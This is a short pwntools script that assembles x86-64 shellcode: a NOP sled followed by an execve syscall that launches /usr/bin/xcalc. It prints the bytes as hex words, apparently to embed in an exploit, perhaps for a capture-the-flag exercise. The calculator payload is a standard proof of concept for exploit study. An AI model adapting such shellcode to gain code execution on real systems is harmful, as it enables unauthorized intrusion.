from pwn import *

context.arch = "amd64"

pl = asm("""
    nop
    nop
    nop
    nop
    mov rax,0x636c6163782f
    push rax
    mov rax,0x6e69622f7273752f
    push rax
    mov rdi,rsp
    xor rdx, rdx
    lea rdx, [rsp+0xc88]
    xor rsi, rsi
    mov rax,0x3b
    syscall
""")

for i in range(0, len(pl), 4):
    print("0x"+pl[i:i+4][::-1].hex(), end=",")
